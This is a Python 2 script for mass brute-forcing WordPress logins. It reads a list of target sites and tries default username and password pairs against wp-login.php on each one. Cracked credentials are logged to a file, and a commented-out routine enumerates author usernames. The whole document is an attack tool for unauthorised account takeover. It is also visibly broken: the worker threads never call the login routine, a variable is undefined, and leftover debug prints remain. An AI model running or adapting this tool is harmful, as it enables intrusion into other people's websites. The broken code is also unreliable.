import sys , re , urllib2 , urllib , cookielib , os 
from platform import system
import threading 
import Queue

if system() == 'Linux':
    os.system('clear')
if system() == 'Windows':
    os.system('cls')
    
   
"""
def user(site , passlist):
	userlist = list()
	i = 1
	# you can edit to whatever number of users you want to enumerate
	while( i <= 5 ) :
		url = site + '?author=%i' % i
		try:
			data = urllib2.urlopen(url).read()
			# cleaning the sh*t
			re1 = re.findall("<title>(.*?)</title>" , data)
			user = re.search("(.*?) |" , re1[0]).group(1)
			userlist.append(user)
		except:
			pass
		i += 1
	wpbrute(site , userlist, passlist)
	return site
	"""
class Worker(threading.Thread):
	
	def __init__(self , queue):
		threading.Thread.__init__(self)
		self.queue = queue
		
	
	def wpbrute(self):
		passlist = ['admin' , 'password' , '123456' , 'password123']
		userlist = ['admin' , 'user']
		while True:
			counter = self.queue.get()
			for user in userlist:
				# if enumeration returns no user
				if user == "" :
					userlist[0] = "admin"
					del userlist[1:]
			
			for user in userlist :
				for password in passlist:
					try:
						print str(site) + ':' +  user + ':' + password
						# found the answer on stackoverflow
						cj = cookielib.CookieJar()
						opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
						login_data = urllib.urlencode({'log' : user, 'pwd' : password})
						opener.open(str(site) + 'wp-login.php', login_data)
						resp = opener.open(str(site)+'wp-admin')
						final = resp.read()
						if '<li id="wp-admin-bar-logout">' in final:
							print "\n\t[*] Cracked : " + str(site) + ':' +  user + ':' + password + '\n'
							with open('wpcracked.txt' , 'a') as myfile:
								myfile.write('~~ Cracked ~~ ' + str(site) + ':' +  user + ':' + password + '\n')
							break
							
					except:
						pass
				
queue = Queue.Queue()

try:
	siteslist = list()
	wpfile = sys.argv[1] 
	#wordlist = sys.argv[2]
	# opening sites file
	sites = open(wpfile).readlines()
	# opening password files	
	#passes = open(wordlist).readlines()
	# passes to list
	"""for pass1 in passes:
		pass1 = pass1.rstrip()
		passlist.append(pass1)"""
	# sites to list
	for site in sites:
		site = site.rstrip()
		if 'http://' not in site:
			site = 'http://' + site
		if '/' != site[-1]:
			site = site + '/'
		queue.put(site)
		
	for i in range(6):
		print queue
		print "aaa %d" %i
		worker = Worker(queue)
		worker.setDaemon(True)
		worker.start()
			
		
	queue.join()
except:
	pass
